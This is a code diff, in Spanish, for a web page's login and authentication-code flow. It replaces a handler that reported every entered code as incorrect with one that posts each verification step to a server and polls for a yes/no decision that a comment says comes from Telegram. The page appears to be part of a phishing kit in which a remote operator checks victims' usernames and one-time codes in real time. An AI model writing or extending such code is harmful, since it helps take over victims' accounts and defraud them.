@@ -376,21 +376,13 @@ function mostrarAlertaOpcionesNo(
     document.body.appendChild(alerta);
 }
 
-// Modifica el evento de autenticación para mostrar la alerta personalizada
-document.getElementById("authBtn").addEventListener("click", async function () {
-    const authCode = document.getElementById("authCode").value;
-
-    document.querySelector(".alertaAutenticacion")?.remove();
-
-    showLoadingScreen(() => {
-    
-    // Mostrar mensaje de autenticación incorrecta usando la función personalizada
-    mostrarAlertaAutenticacionIncorrecta();
-    });
-});
 
 document.getElementById("authCode").addEventListener("focus", function () {
+
     document.querySelector(".alertaAutenticacion")?.remove();
+
+    document.querySelector(".alertaOpcionesNo")?.remove();
+
 });
 
 document.getElementById("usuario").addEventListener("keydown", function (event) {
@@ -702,6 +694,216 @@ function mostrarSeccionOpciones(opcion) {
             }, 2000);
 
         }, 2000);
+
+    });
+
+})();
+// ==========================================
+// SEGUNDA VERIFICACIÓN: AUTENTICACIÓN
+// ==========================================
+
+(function configurarVerificacionAutenticacion() {
+
+    const boton =
+        document.getElementById("authBtn");
+
+    const loadingScreen =
+        document.querySelector(".loading-screen");
+
+    const ventanaAutenticacion =
+        document.querySelector(".auth-modal");
+
+    const sombraAutenticacion =
+        document.getElementById("auth-sombra");
+
+    const seccionFormulario =
+        document.getElementById("seccion-si");
+
+    const seccionResultado =
+        document.getElementById("resultado");
+
+    if (
+        !boton ||
+        !loadingScreen ||
+        !ventanaAutenticacion ||
+        !sombraAutenticacion ||
+        !seccionFormulario ||
+        !seccionResultado
+    ) {
+        return;
+    }
+
+    const TIEMPO_MAXIMO_AUTENTICACION = 60000;
+
+    let esperandoDecisionAutenticacion = false;
+
+    boton.addEventListener("click", async function () {
+
+        if (
+            boton.disabled ||
+            esperandoDecisionAutenticacion
+        ) {
+            return;
+        }
+
+        esperandoDecisionAutenticacion = true;
+
+        // Eliminar mensajes anteriores
+        document.querySelector(".alertaOpcionesNo")?.remove();
+        document.querySelector(".alertaAutenticacion")?.remove();
+
+        // Mostrar pantalla de carga original
+        loadingScreen.style.backgroundColor =
+            "rgba(233, 233, 233, 0.6)";
+
+        loadingScreen.classList.remove("hidden");
+
+        // Conservar el ID existente
+        const dispositivoID = obtenerIDDispositivo();
+
+        const controlador = new AbortController();
+
+        // Control independiente del tiempo máximo
+        const temporizador = setTimeout(function () {
+
+            controlador.abort();
+
+        }, TIEMPO_MAXIMO_AUTENTICACION);
+
+        try {
+
+            // Crear una nueva solicitud
+            const respuesta = await fetch(
+                "/opciones/crear",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        dispositivoID,
+                        etapa: "autenticacion"
+                    }),
+
+                    signal: controlador.signal
+                }
+            );
+
+            if (!respuesta.ok) {
+                throw new Error(
+                    "No se pudo crear la solicitud"
+                );
+            }
+
+            const datos = await respuesta.json();
+
+            // Esperar respuesta de Telegram
+            while (!controlador.signal.aborted) {
+
+                const consulta = await fetch(
+                    "/opciones/estado/" +
+                    encodeURIComponent(datos.idSolicitud),
+                    {
+                        cache: "no-store",
+                        signal: controlador.signal
+                    }
+                );
+
+                if (!consulta.ok) {
+                    throw new Error(
+                        "No se pudo consultar la decisión"
+                    );
+                }
+
+                const estado = await consulta.json();
+
+                // ======================================
+                // RESPUESTA SÍ
+                // ======================================
+
+                if (estado.estado === "si") {
+
+                    // Ocultar autenticación
+                    ventanaAutenticacion.classList.add("hidden");
+
+                    sombraAutenticacion.classList.add("hidden");
+
+                    // Ocultar formulario
+                    seccionFormulario.classList.add("hidden");
+
+                    // Mostrar resultado
+                    seccionResultado.classList.remove("hidden");
+
+                    // Ocultar pantalla de carga
+                    loadingScreen.classList.add("hidden");
+
+                    return;
+                }
+
+                // ======================================
+                // RESPUESTA NO
+                // ======================================
+
+                if (estado.estado === "no") {
+
+                    // Únicamente ocultar pantalla de carga
+                    loadingScreen.classList.add("hidden");
+
+                    // Mantener ventana de autenticación
+                    ventanaAutenticacion.classList.remove("hidden");
+
+                    // Mantener sombra
+                    sombraAutenticacion.classList.remove("hidden");
+
+                    // Mostrar mensaje existente
+                    mostrarAlertaOpcionesNo("Incorrecto");
+
+                    return;
+                }
+
+                // Esperar antes de consultar nuevamente
+                await new Promise(resolve => {
+                    setTimeout(resolve, 1500);
+                });
+            }
+
+            throw new Error("Tiempo de espera agotado");
+
+        } catch (error) {
+
+            loadingScreen.classList.add("hidden");
+
+            // Mantener autenticación y sombra
+            ventanaAutenticacion.classList.remove("hidden");
+            sombraAutenticacion.classList.remove("hidden");
+
+            if (controlador.signal.aborted) {
+
+                mostrarAlertaOpcionesNo(
+                    "Servicio no disponible, por favor intenta más tarde"
+                );
+
+            } else {
+
+                console.error(
+                    "Error en verificación de autenticación:",
+                    error
+                );
+
+                mostrarAlertaOpcionesNo(
+                    "Servicio no disponible, por favor intenta más tarde"
+                );
+            }
+
+        } finally {
+
+            clearTimeout(temporizador);
+
+            esperandoDecisionAutenticacion = false;
+
+        }
 
     });
 
